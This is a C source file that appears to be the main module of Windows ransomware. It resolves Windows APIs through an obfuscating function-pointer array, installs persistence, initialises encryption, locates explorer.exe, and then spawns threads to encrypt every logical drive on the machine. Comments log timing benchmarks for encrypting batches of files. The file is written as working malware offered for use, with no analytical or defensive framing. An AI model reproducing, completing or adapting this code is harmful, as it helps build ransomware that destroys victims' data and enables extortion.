#include "Persistent.h"
#include "Crypto.h"
#include "Threading.h"
#include "File.h"
#include "PE.h"
extern FARPROC APIArray[52];

int beginEncrypt() {
	typedef DWORD(WINAPI* MemeGetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);

	MemeGetLogicalDriveStringsA TempGetLogicalDriveStringsA = (MemeGetLogicalDriveStringsA)APIArray[2];

	DWORD driveStrSize = TempGetLogicalDriveStringsA(0, 0);
	LPSTR driveBuffer = (LPSTR)calloc(driveStrSize + 2, 1);
	if (!driveBuffer) {
		return -1;
	}

	TempGetLogicalDriveStringsA(driveStrSize, driveBuffer);

	for (int i = 0; i < driveStrSize - 1; i += strlen(driveBuffer) + 1) {
		launchThreadEncrypt(driveBuffer + i);
	}
	free(driveBuffer);
	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	if (initAPIArray() == -1) {
		return -1;
	}

	if (mainPersist() == -1) {
		return -1;
	}
	if (cryptInit() == -1) {
		return -1;
	}
	findExplorerExe();
	if (initThreadStruct() == -1) {
		cryptCleanUp();
		cleanExplorerLL();
		return -1;
	}

	// 10387 small files -> 15039 ms to encrypt small files
	// 53 medium files -> 6237 ms to encrypt medium files
	// 25 large files -> 25000 ms to encrypt large files

	beginEncrypt();
	cleanUpThread();
	cryptCleanUp();
	cleanExplorerLL();
	persistCleanUp();
	return 0;
}
